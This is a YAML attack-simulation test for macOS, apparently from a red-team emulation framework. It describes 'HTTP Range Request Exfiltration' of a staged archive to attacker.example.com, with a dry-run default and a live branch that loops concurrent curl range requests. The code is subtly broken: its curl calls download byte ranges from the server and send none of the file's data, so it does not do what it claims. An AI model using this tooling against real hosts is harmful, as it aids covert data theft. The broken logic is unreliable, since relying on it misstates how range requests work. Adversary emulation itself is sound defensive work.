id: 018-http-range-request-exfiltration
name: HTTP Range Request Exfiltration
description: Covert exfiltration using HTTP range requests to bypass monitoring
api_version: 2.0
platforms:
  - os: darwin
uuid: f8a0b1c2-d310-4e4f-5a6b-7c8d9e0f1011
requirements:
  platforms:
    - os: darwin
      min_version: 10.12
args:
  data_file:
    description: File to exfiltrate
    type: string
    default: "/tmp/.staging/data.tar.gz"
  server_url:
    description: HTTP server for range requests
    type: string
    default: "http://attacker.example.com/storage"
  range_size:
    description: Byte range per request
    type: string
    default: "4096"
  concurrent_requests:
    description: Number of concurrent requests
    type: string
    default: "4"
  dry_run:
    description: Enable dry-run mode
    type: string
    default: "true"
steps:
  - name: Verify file exists
    type: command
    executor: bash
    command: test -f '{{ args.data_file }}' || (echo "File not found"; exit 1)
    cleanup: false
  
  - name: Calculate range request strategy
    type: command
    executor: bash
    command: |
      echo "HTTP Range Request Exfiltration:"
      echo "  File: $(basename '{{ args.data_file }}')"
      filesize=$(stat -f%z '{{ args.data_file }}' 2>/dev/null || stat -c%s '{{ args.data_file }}')
      echo "  Size: $(du -h '{{ args.data_file }}' | cut -f1) ($filesize bytes)"
      echo "  Range size: {{ args.range_size }} bytes"
      
      total_ranges=$((filesize / {{ args.range_size }} + 1))
      echo "  Total range requests: $total_ranges"
      echo "  With {{ args.concurrent_requests }} concurrent: $((total_ranges / {{ args.concurrent_requests }} + 1)) batches"
    cleanup: false
  
  - name: Prepare range request headers
    type: command
    executor: bash
    command: |
      echo "HTTP Range Request Headers:"
      echo "  Range: bytes=0-{{ args.range_size }}"
      echo "  Range: bytes={{ args.range_size }}-$(({{ args.range_size }} * 2))"
      echo ""
      echo "Server response would include:"
      echo "  HTTP/1.1 206 Partial Content"
      echo "  Content-Range: bytes 0-{{ args.range_size }}/[total]"
      echo "  Content-Length: {{ args.range_size }}"
    cleanup: false
  
  - name: Execute range request exfiltration
    type: command
    executor: bash
    command: |
      if [ '{{ args.dry_run }}' = 'true' ]; then
        echo "DRY RUN: HTTP Range Request Exfiltration"
        echo "Strategy:"
        echo "  1. Calculate file size and range boundaries"
        echo "  2. Split exfiltration into {{ args.range_size }}-byte chunks"
        echo "  3. Send concurrent HTTP range requests"
        echo "  4. Reconstruct data from partial responses"
        echo ""
        echo "Sample commands:"
        for i in {0..2}; do
          start=$((i * {{ args.range_size }}))
          end=$((start + {{ args.range_size }} - 1))
          echo "  curl -r $start-$end '{{ args.server_url }}/data'"
        done
      else
        echo "Initiating range request exfiltration..."
        filesize=$(stat -f%z '{{ args.data_file }}' 2>/dev/null || stat -c%s '{{ args.data_file }}')
        
        for ((i=0; i<filesize; i+={{ args.range_size }})); do
          end=$((i + {{ args.range_size }} - 1))
          if [ $end -gt $filesize ]; then
            end=$((filesize - 1))
          fi
          
          curl -r $i-$end '{{ args.server_url }}/data' &
          
          # Limit concurrent connections
          active=$(jobs -r | wc -l)
          while [ $active -ge {{ args.concurrent_requests }} ]; do
            sleep 0.1
            active=$(jobs -r | wc -l)
          done
        done
        wait
      fi
    cleanup: false
checks:
  - name: File exists
    description: Verify file for exfiltration
    type: command
    command: test -f '{{ args.data_file }}'
  
  - name: Valid server URL
    description: Verify HTTP endpoint
    type: command
    command: echo '{{ args.server_url }}' | grep -qE '^https?://' && echo "Valid URL"
tests:
  dry_run:
    - name: Test HTTP range request (dry-run)
      description: Test range request exfiltration
      type: basic
      steps:
        - name: Create test file
          type: command
          executor: bash
          command: dd if=/dev/zero of=/tmp/test_ranges.dat bs=1K count=20 2>/dev/null
        
        - name: Calculate ranges
          type: command
          executor: bash
          command: |
            filesize=$(stat -f%z /tmp/test_ranges.dat 2>/dev/null || stat -c%s /tmp/test_ranges.dat)
            echo "File size: $filesize bytes"
            echo "Range requests (4096-byte chunks):"
            for i in {0..4}; do
              start=$((i * 4096))
              end=$((start + 4095))
              printf "  Range: bytes=%d-%d\n" $start $end
            done
        
        - name: Show sample command
          type: command
          executor: bash
          command: echo "curl -r 0-4095 http://attacker.example.com/storage/data"
cleanup:
  - name: Remove test file
    type: command
    executor: bash
    command: rm -f /tmp/test_ranges.dat
    ignore_errors: true
